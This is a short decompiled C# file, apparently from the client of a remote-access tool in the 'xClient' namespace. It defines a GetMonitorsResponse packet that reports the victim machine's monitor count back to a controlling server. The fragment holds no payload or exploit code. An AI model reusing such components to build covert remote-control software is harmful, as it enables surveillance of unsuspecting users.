using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets
{
	// Token: 0x02000089 RID: 137
	[Serializable]
	public class GetMonitorsResponse : IPacket
	{
		// Token: 0x17000086 RID: 134
		// (get) Token: 0x06000393 RID: 915 RVA: 0x00003C50 File Offset: 0x00001E50
		// (set) Token: 0x06000394 RID: 916 RVA: 0x00003C58 File Offset: 0x00001E58
		public int Number { get; set; }

		// Token: 0x06000395 RID: 917 RVA: 0x000021D4 File Offset: 0x000003D4
		public GetMonitorsResponse()
		{
		}

		// Token: 0x06000396 RID: 918 RVA: 0x00003C61 File Offset: 0x00001E61
		public GetMonitorsResponse(int number)
		{
			this.Number = number;
		}

		// Token: 0x06000397 RID: 919 RVA: 0x00003C70 File Offset: 0x00001E70
		public void Execute(Client client)
		{
			client.Send<GetMonitorsResponse>(this);
		}
	}
}
